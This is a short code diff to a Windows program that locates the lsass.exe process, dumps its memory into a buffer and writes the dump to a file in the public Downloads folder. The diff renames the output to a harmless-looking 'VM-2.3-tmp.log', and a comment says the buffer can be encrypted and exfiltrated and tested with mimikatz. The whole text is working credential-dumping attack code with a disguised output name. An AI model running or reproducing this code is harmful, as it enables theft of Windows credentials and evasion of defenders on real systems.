@@ -60,6 +60,7 @@ int main() {
     LPTSTR name = (LPTSTR)(LPCTSTR)"lsass.exe";
     DWORD bytesWritten = 0;
     ULONG t ;
+    LPCSTR savePath = "C:\\Users\\Public\\Downloads\\VM-2.3-tmp.log";
 
     // Get lsass PID
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -99,14 +100,14 @@ int main() {
 
 
     if (isDumped) {
-        printf("\n[*] lsass dumped to memory 0x%p\n", dumpBuffer);
+        printf("[*] lsass dumped to memory 0x%p\n", dumpBuffer);
         // At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
-        HANDLE outFile = CreateFile((LPCSTR)("C:\\Users\\Public\\Downloads\\debug.log"), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE outFile = CreateFile(savePath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
         //// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
         if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
         {
-            printf("\n[+] to C:\\Users\\Public\\Downloads\\debug.log\n");
+            printf("[*] savePath: %s\n", savePath);
         }
         cout << "[*] lsass dumped successfully" << endl;
     }
